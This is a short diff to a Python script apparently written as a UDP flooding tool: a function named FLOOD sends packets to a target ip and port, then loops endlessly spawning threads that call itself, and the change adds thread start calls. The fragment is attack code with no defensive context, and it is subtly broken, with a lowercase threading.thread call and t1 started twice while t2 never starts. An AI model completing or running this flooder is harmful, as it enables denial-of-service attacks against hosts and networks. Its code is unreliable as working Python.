@@ -11,5 +11,7 @@ def FLOOD():
     s.sendto(bytes,(ip,port))
     while True:
         t1 = threading.thread(target=FLOOD)
+        t1.start()
         t2 = threading.thread(target=FLOOD)
+        t1.start()
 FLOOD()
